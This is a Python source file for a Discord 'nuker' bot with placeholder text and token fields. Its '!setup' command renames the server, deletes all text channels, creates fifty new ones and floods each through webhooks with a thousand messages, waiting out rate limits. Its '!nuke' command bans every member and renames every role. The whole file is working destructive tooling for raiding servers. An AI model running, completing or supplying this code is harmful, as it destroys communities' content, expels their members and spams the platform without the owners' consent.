import discord
import asyncio
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True  

bot = commands.Bot(command_prefix="!", intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def setup(ctx):
    guild = ctx.guild
    
    try:
        await guild.edit(name="YOUR_TEXT")
        print(f"Server name changed to 'YOUR_TEXT'.")

        
        delete_channel_tasks = []
        for channel in guild.text_channels:
            try:
                await channel.delete()
                print(f"Deleted channel: {channel.name}")
            except discord.HTTPException as e:
                if e.code == 50074:  
                    print(f"Skipped channel '{channel.name}' (Community required channel)")
                else:
                    print(f"Failed to delete {channel.name}: {e}")

        print("Deleted all non-community channels.")

        
        category_name = "YOUR_TEXT"
        category = await guild.create_category(name=category_name)
        print(f'Category "{category_name}" created.')

        max_channels_per_category = 50  
        base_channel_name = "YOUR_TEXT"
        create_channel_tasks = [guild.create_text_channel(name=f"{base_channel_name}-{i+1}", category=category) for i in range(max_channels_per_category)]

        created_channels = await asyncio.gather(*create_channel_tasks)
        print(f"Created {max_channels_per_category} channels.")

        
        send_message_tasks = []
        for channel in created_channels:
            try:
                webhook = await channel.create_webhook(name="YOUR_TEXT")
                send_message_tasks.append(asyncio.create_task(send_message_concurrently(webhook, 1)))  
            except Exception as e:
                print(f"Failed to create webhook for {channel.name}: {e}")

        await asyncio.gather(*send_message_tasks)
        print("Webhook messages sent.")

        await ctx.send(f"Setup complete. Created {max_channels_per_category} channels.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")
        print(f"Error: {e}")

async def send_message_concurrently(webhook, delay):
    try:
        for _ in range(1000): 
            try:
                await webhook.send("YOUR_TEXT")
                print(f"Sent message to webhook: {webhook.url}")
                await asyncio.sleep(delay)  
            except discord.HTTPException as e:
                if e.code == 429:  
                    retry_after = e.retry_after
                    print(f"Rate limited! Retrying after {retry_after} seconds.")
                    await asyncio.sleep(retry_after)  
                    continue
                else:
                    print(f"Error sending message using webhook {webhook.url}: {e}")
                    break  
    except Exception as e:
        print(f"Error in send_message_concurrently for webhook {webhook.url}: {e}")

@bot.command()
async def nuke(ctx):
    for member in ctx.guild.members:
        if member != bot.user:  
            try:
                await member.ban(reason="YOUR_TEXT")
                print(f"Banned: {member}")
            except Exception as e:
                print(f"Failed to ban {member}: {e}")

    for role in ctx.guild.roles:
        if role.name != "@everyone":  
            try:
                await role.edit(name="YOUR_TEXT")
                print(f"Renamed role: {role}")
            except Exception as e:
                print(f"Failed to rename {role}: {e}")

bot.run("BOT_TOKEN")
